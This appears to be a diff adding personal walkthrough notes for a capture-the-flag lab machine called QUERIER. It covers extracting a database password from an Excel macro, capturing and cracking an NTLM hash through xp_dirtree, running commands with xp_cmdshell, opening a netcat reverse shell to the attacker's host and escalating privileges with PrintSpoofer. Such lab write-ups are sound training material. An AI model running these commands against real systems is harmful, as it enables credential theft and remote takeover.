@@ -1,0 +1,266 @@
+---
+sort : 2
+---
+
+# nmap scans
+
+PORT        STATE   SERVICE         VERSION
+135/tcp     open    msrpc           Microsoft Windows RPC
+139/tcp     open    netbios-ssn     Microsoft Windows netbios-ssn
+445/tcp     open    microsoft-ds?
+1433/tcp    open    ms-sql-s        Microsoft SQL Server 2017 14.00.1000.00; RTM
+5985/tcp    open    wsman
+47001/tcp   open    winrm
+5985/tcp    open    http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp   open    http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+```bash
+$ smbclient -N -L \\\\IP
+
+$ smbclient -N \\\\IP\ShareName
+
+smb> get File.xlsm
+
+# you can unzip the xlsm files !!!!!! 
+$ unzip File.xlsm
+
+# macros usually stored at xl/vbaProject.bin
+$ strings xl/*.bin
+
+# OR !! 
+$ olevba File.xlsm 
+# VBA MACRO ThisWorkbook.cls 
+# in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
+# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+# ' macro to pull data for client volume reports
+# '
+# ' further testing required
+
+# Private Sub Connect()
+
+# Dim conn As ADODB.Connection
+# Dim rs As ADODB.Recordset
+
+# Set conn = New ADODB.Connection
+# conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
+# conn.ConnectionTimeout = 10
+# conn.Open
+
+# If conn.State = adStateOpen Then
+
+#   ' MsgBox "connection successful"
+ 
+#   'Set rs = conn.Execute("SELECT * @@version;")
+#   Set rs = conn.Execute("SELECT * FROM volume;")
+#   Sheets(1).Range("A1").CopyFromRecordset rs
+#   rs.Close
+
+# End If
+
+# End Sub
+# -------------------------------------------------------------------------------
+# VBA MACRO Sheet1.cls 
+# in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
+# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+# (empty macro)
+# +----------+--------------------+---------------------------------------------+
+# |Type      |Keyword             |Description                                  |
+# +----------+--------------------+---------------------------------------------+
+# |Suspicious|Open                |May open a file                              |
+# |Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+# |          |                    |used to obfuscate strings (option --decode to|
+# |          |                    |see all)                                     |
+# +----------+--------------------+---------------------------------------------+
+```
+
+the user is "Reporting"
+it's password is "PcwTWTHRwryjc$c6"
+
+
+# Connecting to MSSQL DB
+
+```bash
+$ impacket-mssqlclient USERNAME:'PASSWORD'@IP -windows-auth
+
+$ impacket-mssqlclient Reporting:'passws'@10.129.116.33 -windows-auth
+# [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
+
+# you should find a user with SA privilege
+
+# we can steal hashes of the SQL service account by using xp_dirtree or xp_fileexist.
+
+
+# and on another terminal 
+$ impacket-smbserver share-kali . -smb2support
+
+# then back to impacket-mssqlclient
+SQL> xp_dirtree '\\IP_tun0\share-kali\any.txt'
+
+# look at the smb-server you ran, this will show the NTLM hash of the user !! 
+
+# [*] User QUERIER\mssql-svc authenticated successfully
+# [*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:f439c56c09a064c19b40fee71273d309:01010000000000000097f8fed4d4d90104f8ab380c1da0d80000000001001000630048004e006500570042005900520003001000630048004e0065005700420059005200020010004e0050005800580067004d006a004100040010004e0050005800580067004d006a004100070008000097f8fed4d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000
+# [*] Connecting Share(1:IPC$)
+# [*] Connecting Share(2:share-kali)
+# [*] AUTHENTICATE_MESSAGE (\,QUERIER)
+# [*] User QUERIER\ authenticated successfully
+# [*] :::00::aaaaaaaaaaaaaaaa
+
+
+$ echo "mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:0101000000000000002f2676c5d4d90181d517003f90cf7e000000000100100041007a004800770071007700410079000300100041007a00480077007100770041007900020010007700580070004b0057004e004b004900040010007700580070004b0057004e004b00490007000800002f2676c5d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000" > hash
+
+$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt # test1234
+
+$ impacket-mssqlclient mssql-svc:'test1234'@10.129.116.33 -windows-auth
+SQL> enable_xp_cmdshell # success !! 
+SQL> xp_cmdshell "type ..\..\Users\mssql-svc\Desktop\user.txt"
+
+# to get a reverse shell, and bypass the AV 
+# install nc64.exe from github https://github.com/int0x33/nc.exe/
+# download nc64.exe on the smb-server on the attacker machine.
+
+SQL> xp_cmdshell "copy \\IP_tun0\share-kali\nc64.exe C:\Users\Public\nc64.exe"
+
+# why we copied it to the Public folder ..... cuz it's mostly writable !! 
+
+$ nc -lnvp 1234
+
+SQL> xp_cmdshell "C:\Users\Public\nc64.exe -e cmd.exe IP_tun0 1234" 
+
+C:\Windows\system32> # Good luck
+
+C:\Windows\system32> whoami /all
+
+C:\Windows\system32> whoami /priv
+# PRIVILEGES INFORMATION
+# ----------------------
+
+# Privilege Name                Description                               State   
+# ============================= ========================================= ========
+# SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+# SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+# SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+# SeImpersonatePrivilege        Impersonate a client after authentication Enabled   ==> this always can be exploited 
+# SeCreateGlobalPrivilege       Create global objects                     Enabled 
+# SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell dir ..\..\Users\mssql-svc\Desktop\user.txt
+```
+
+
+
+
+# ntlm relay
+
+
+User QUERIER\mssql-svc authenticated successfully
+[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:0101000000000000002f2676c5d4d90181d517003f90cf7e000000000100100041007a004800770071007700410079000300100041007a00480077007100770041007900020010007700580070004b0057004e004b004900040010007700580070004b0057004e004b00490007000800002f2676c5d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share-kali)
+[*] AUTHENTICATE_MESSAGE (\,QUERIER)
+[*] User QUERIER\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+
+
+```bash
+echo "mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:0101000000000000002f2676c5d4d90181d517003f90cf7e000000000100100041007a004800770071007700410079000300100041007a00480077007100770041007900020010007700580070004b0057004e004b004900040010007700580070004b0057004e004b00490007000800002f2676c5d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000" > hash
+
+$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt # test1234
+```
+
+corporate568
+
+## what is mssql-svc
+
+```bash
+
+```
+
+type of windows accounts: 
+* user aacount 
+* machine account
+* service account ======> mostly it has the SeImpersonatePrivilege enabled !! 
+
+
+
+usnig nc64.exe bypasses the AV !! 
+
+sometimes we can't run a powershell commands on the system !! 
+
+# SE impersonate
+
+# access tockens exploits hack
+
+## what are Access Tokens
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens 
+
+Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token. The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current logon session.
+
+When a local administrator logins, two access tokens are created: One with admin rights and other one with normal rights. By default, when this user executes a process the one with regular (non-administrator) rights is used. When this user tries to execute anything as administrator ("Run as Administrator" for example) the UAC will be used to ask for permission.
+If you want to learn more about the UAC read this page.
+
+```bash
+$ nc -lnvp 1235
+```
+
+```powershell
+C:\Windows\system32> PrintSpoofer64.exe -c "rev.exe 10.10.16.6 1235 -e cmd.exe"
+```
+
+
+PrintSpoofer : : used mostly when you have a service account
+
+JuicyPotato : : used mostly when you have a user account
+
+
+
+<br>
+<br>
+<br>
+
+===============================================================
+
+<br>
+<br>
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
